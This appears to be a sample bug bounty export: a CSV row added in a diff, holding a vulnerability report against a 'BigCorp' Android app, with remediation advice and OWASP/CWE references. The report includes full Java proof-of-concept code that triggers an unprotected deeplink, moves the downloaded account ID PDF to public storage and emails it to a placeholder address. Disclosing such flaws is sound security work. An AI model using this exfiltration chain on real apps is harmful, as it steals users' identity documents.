@@ -1,0 +1,198 @@
+reference_number,bounty_code,source,username,title,caption,priority,amount,points,paid_at,vrt_lineage,substate,state,duplicate,bug_url,description,http_request,extra_info,submitted_at,validated_at,closed_at,target_name,target_category,remediation_advice,vulnerability_references
+ab81a5ea23230b0aa8e259c8749b76c390acbf1f6856c594319caaeizit9zah5,bigcorp,platform,Haxor-01,Steal files with BigCorp deeplinks exploited by third party apps on Android,Steal files with BigCorp deeplinks exploited by third party apps on Android,2,900,20,2020-01-11 10:58:24 UTC,Insecure Data Storage > Sensitive Application Data Stored Unencrypted > On External Storage,unresolved,open,FALSE,bigcorpapp://launch/autoid,"Hello,
+
+I found a way to access sensitive files with third party applications using BigCorp deeplinks effectively bypassing authentication (Uses persisted session from a logged in account) and CSRF protections. I've created a PoC that ex-filtrates files in three steps.
+
+This would not be possible via web access because of CSRF protections. On mobile this acts as a shortcut to downloading Account ID cards without having to navigate to the Account section of the mobile application.
+
+### Impact
+
+BigCorp users can be tricked into having their sensitive data stolen via access to deeplinks by third party apps. Any document that is auto-downloaded can be ex-filtrated with the PoC provided. It's very common for apps to have sessions stay open after login and this exploit chain leverages that feature.
+
+So far I've been able to expose the following information from my account: Full name, Account type, Account ID number, Sales Code, Phone Number. 
+
+---
+
+### Steps to reproduce
+
+1. Log into the BigCorp mobile app and open my PoC app to automate the rest of the steps
+
+### How the exploit chain works
+
+2. Use the following deeplink by transferring this html to the Android device with `adb push bigcorp-deeplink-poc.html /sdcard/Download`.
+
+```
+<html>
+<p class=""p2"">- <a href=""bigcorpapp://launch/autoid"">autoid</a></p>
+</html
+```
+3 . The account information including full name and account ID number automatically download to `sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/`
+
+4 . This confirms that all request origins are accepted and allow files to be downloaded automatically.
+
+5 . My PoC app downloads MbAutoIdCardsServlet.pdf to a public shareable directory -> copies the file and moves it to `/storage/emulated/0/Download/` -> Finally the app sends the document via email. Note: Step 3 can be completed automated with Javamail in Android. [https://medium.com/@ssaurel/how-to-send-an-email-with-javamail-api-in-android-2fc405441079](https://medium.com/@ssaurel/how-to-send-an-email-with-javamail-api-in-android-2fc405441079)
+
+---
+
+### PoC code
+
+```java
+package hazor.bigcorp_poc;
+
+import android.annotation.TargetApi;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+
+import android.os.Handler;
+import android.os.StrictMode;
+import android.support.v7.app.AppCompatActivity;
+import android.util.Log;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+
+
+
+public class MainActivity extends AppCompatActivity {
+
+    private static final String TAG = ""PoCActivity"";
+    String dir = ""sdcard/Android/data/com.bigcorp.mobile.android.bigcorp/files/BIGCORP_DOCS/"";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder(); StrictMode.setVmPolicy(builder.build());
+        if (shouldAskPermissions()) {
+            askPermissions();
+        }
+        //Step 1
+        requestDeeplink();
+        //Step 2
+        Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            public void run() {
+                Log.i(TAG, ""Starting file move"");
+                moveFile(dir, ""MbAutoIdCardsServlet.pdf"", ""/storage/emulated/0/Download/"");
+            }
+        }, 10000);
+        //Step 3
+        handler.postDelayed(new Runnable() {
+            public void run() {
+                Log.i(TAG, ""Starting file send"");
+                sendToEmail(""/storage/emulated/0/Download/"", ""AccountIDCardsServlet.pdf"");
+            }
+        }, 10000);
+    }
+
+    private void requestDeeplink() {
+        Uri uri = Uri.parse(""bigcorpapp://launch/autoid"");
+        Intent startDownloadIntent = new Intent(Intent.ACTION_VIEW, uri);
+        startActivity(startDownloadIntent);
+    }
+
+    private void moveFile(String inputPath, String inputFile, String outputPath) {
+
+        InputStream in = null;
+        OutputStream out = null;
+        try {
+
+            //create output directory if it doesn't exist
+            File dir = new File (outputPath);
+            if (!dir.exists())
+            {
+                dir.mkdirs();
+            }
+
+
+            in = new FileInputStream(inputPath + inputFile);
+            out = new FileOutputStream(outputPath + inputFile);
+
+            byte[] buffer = new byte[1024];
+            int read;
+            while ((read = in.read(buffer)) != -1) {
+                out.write(buffer, 0, read);
+            }
+            in.close();
+            in = null;
+
+            // write the output file
+            out.flush();
+            out.close();
+            out = null;
+
+            // delete the original file
+            new File(inputPath + inputFile).delete();
+
+
+        }
+
+        catch (FileNotFoundException fnfe1) {
+            Log.e(""tag"", fnfe1.getMessage());
+        }
+        catch (Exception e) {
+            Log.e(""tag"", e.getMessage());
+        }
+
+    }
+
+    private void sendToEmail(String folder_name, String file_name) {
+        try {
+            Intent intent = new Intent(Intent.ACTION_SENDTO);
+            intent.setType(""text/plain"");
+            String message=""File to be shared is "" + file_name + ""."";
+            intent.putExtra(Intent.EXTRA_SUBJECT, ""Subject"");
+            intent.putExtra(Intent.EXTRA_STREAM, Uri.parse( ""file:///"" + folder_name + file_name));
+            intent.putExtra(Intent.EXTRA_TEXT, message);
+            intent.setData(Uri.parse(""mailto:hazor@example.com""));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+
+            startActivity(intent);
+            
+        } catch(Exception e)  {
+            System.out.println(""is exception raises during sending mail"" + e);
+        }
+    }
+    protected boolean shouldAskPermissions() {
+        return (Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP_MR1);
+    }
+
+    @TargetApi(23)
+    protected void askPermissions() {
+        String[] permissions = {
+                ""android.permission.READ_EXTERNAL_STORAGE"",
+                ""android.permission.WRITE_EXTERNAL_STORAGE""
+        };
+        int requestCode = 200;
+        requestPermissions(permissions, requestCode);
+    }
+
+}
+
+```
+
+---
+
+### How to fix
+
+Some ideas on how to fix this.
+
+1. Check origin of the deeplink request and only allow requests from bigcorp.com or mobile apps
+
+2. Download files to a non-public directory like `/data/data/com.bigcorp.mobile.android.bigcorp/cache/*` 
+
+3. Restrict app's protected folders and URIs
+
+Please let me know if you have any questions!
+",,,2020-03-01 06:15:06 UTC,2020-03-04 16:09:59 UTC,,BigCorp Mobile Application for Android,android,"1. Never store sensitive application data unencrypted.
+2. Use the strongest encryption algorithms such as AES with a minimum of a 256-bit key size for application data storage.","* [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Cryptographic_Storage_Cheat_Sheet.md)
+* [https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure)
+* [https://cwe.mitre.org/data/definitions/312](https://cwe.mitre.org/data/definitions/312)
+* [https://cwe.mitre.org/data/definitions/729](https://cwe.mitre.org/data/definitions/729)
+* [https://cwe.mitre.org/data/definitions/922](https://cwe.mitre.org/data/definitions/922)"
